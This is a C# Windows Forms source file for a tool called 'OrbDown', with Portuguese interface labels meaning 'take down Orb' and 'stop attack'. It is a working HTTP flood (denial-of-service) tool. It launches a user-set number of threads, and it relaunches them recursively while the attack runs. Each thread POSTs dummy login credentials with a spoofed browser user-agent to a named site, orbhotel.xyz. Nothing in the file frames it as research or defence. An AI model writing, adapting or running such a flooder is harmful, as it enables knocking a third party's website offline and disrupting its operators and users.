using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace OrbDown
{
	public partial class Form1 : Form
	{
		public bool atacar = false;
		public int threads = 500;

		public Form1()
		{
			InitializeComponent();
			Debug.WriteLine("Iniciado!");
		}

		private void label1_Click(object sender, EventArgs e)
		{

		}

		private void Form1_Load(object sender, EventArgs e)
		{

		}

		private void button1_Click(object sender, EventArgs e)
		{

			if (button1.Text == "Derrubar Orb")
			{
				button1.Text = "Parar Ataque";
				threads = int.Parse(textBox1.Text);
				atacar = true;

				Thread iniciar = new Thread(new ThreadStart(iniciarThreads));
				iniciar.Start();

			} else {
				button1.Text = "Derrubar Orb";
				atacar = false;
			}

		}

		public async void iniciarThreads()
		{
			for (int i = 0; i <= threads; i++)
			{
				Thread iniciar = new Thread(new ThreadStart(VaiPorra));
				iniciar.Start();
				Debug.WriteLine($"VAI! {i}");

			}

			if (atacar)
			{
				iniciarThreads();
			}
		}

		public async void VaiPorra()
		{
			try
			{
				if (atacar)
				{
					using (var client = new WebClient())
					{
						var values = new NameValueCollection();
						values["username_1"] = "TesteAtaque";
						values["password_1"] = "TesteAtaque";
						client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.227");
						client.UploadValues("https://orbhotel.xyz/", values);
					}
				}
			}
			catch { }
		}

		private void textBox1_TextChanged(object sender, EventArgs e)
		{

		}

		private void label2_Click(object sender, EventArgs e)
		{

		}
	}
}
